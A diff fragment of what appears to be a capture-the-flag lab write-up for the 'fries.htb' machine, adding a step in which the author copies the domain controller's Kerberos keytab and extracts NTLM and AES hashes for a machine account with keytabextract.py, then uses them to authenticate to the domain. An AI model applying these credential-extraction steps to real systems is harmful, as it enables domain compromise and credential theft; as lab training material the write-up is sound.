@@ -791,7 +791,24 @@ scp -i ../id_rsa_root root@dc01.fries.htb:/etc/krb5.keytab .
 krb5.keytab
 ```
 
-Firsyt
+First ill transfer the keytab file from the target to my machine
+
+```python
+python3 keytabextract.py krb5.keytab 
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+	REALM : FRIES.HTB
+	SERVICE PRINCIPAL : WEB$/
+	NTLM HASH : 61e3599900d7a81c373bcbaaa755bdb2
+	AES-256 HASH : c2f611ea95c0890050a5025a0421faa8efee4d525dfabbeb14c25d456a770989
+	AES-128 HASH : 8a735f6c676faf8c27fef46fe7209a81
+```
+
+I now have a user i can use to authenticate to the domain
+
+
 
 
 
